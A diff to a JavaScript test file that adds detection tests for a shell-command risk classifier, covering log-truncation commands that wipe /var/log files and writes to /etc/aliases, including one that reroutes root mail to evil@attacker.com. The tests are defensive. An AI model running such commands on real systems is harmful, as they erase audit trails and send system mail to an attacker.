@@ -818,6 +818,59 @@ describe('classifyCommand v1.10.67 patterns', () => {
     }
   });
 
+  // (v1.10.137) Two minor additions: log-truncate (medium) for
+  // anti-forensic /var/log/ wipes; system-files extended with
+  // /etc/aliases (mail-rerouting attack target).
+  it('log-truncate: redirect / truncate / shred /var/log/* → medium (v1.10.137)', () => {
+    for (const cmd of [
+      'echo > /var/log/auth.log',
+      'echo > /var/log/syslog',
+      'truncate -s 0 /var/log/auth.log',
+      'shred -n 0 -uvz /var/log/auth.log',
+      'shred /var/log/audit/audit.log',
+      '> /var/log/messages',
+      'truncate -s 0 /var/log/audit.log',
+      'shred --remove /var/log/auth.log',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.ok(['medium', 'high'].includes(r.level), `${cmd} should be medium+ (got ${r.level})`);
+      assert.ok(r.reasons.some((x) => x.code === 'log-truncate'),
+        `${cmd}: expected log-truncate`);
+    }
+  });
+
+  it('log-truncate — read / non-log paths stay low (regression)', () => {
+    for (const cmd of [
+      'cat /var/log/auth.log',
+      'tail -f /var/log/syslog',
+      'echo logs > /tmp/log',                 // /tmp not /var/log
+      'truncate -s 100M file.tmp',            // user file
+      'shred /tmp/secret.txt',                // user file
+      'less /var/log/messages',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.ok(!r.reasons.some((x) => x.code === 'log-truncate'),
+        `${cmd}: should not match log-truncate`);
+    }
+  });
+
+  it('system-files: /etc/aliases mail rerouting → high (v1.10.137 extension)', () => {
+    // Adding "root: evil@attacker.com" to /etc/aliases reroutes
+    // root mail (cron failures, package update notifications,
+    // sudo error logs) to an attacker. Same threat tier as the
+    // existing /etc/<file> targets.
+    for (const cmd of [
+      'echo "root: evil@attacker.com" >> /etc/aliases',
+      'cat aliases | tee /etc/aliases',
+      'echo "admin: x@y" > /etc/aliases',
+    ]) {
+      const r = classifyCommand(cmd);
+      assert.strictEqual(r.level, 'high', `${cmd} should be high`);
+      assert.ok(r.reasons.some((x) => x.code === 'system-files'),
+        `${cmd}: expected system-files`);
+    }
+  });
+
   it('reading non-credential dotfiles stays low (regression)', () => {
     for (const cmd of [
       'cat ~/.bashrc',         // routine
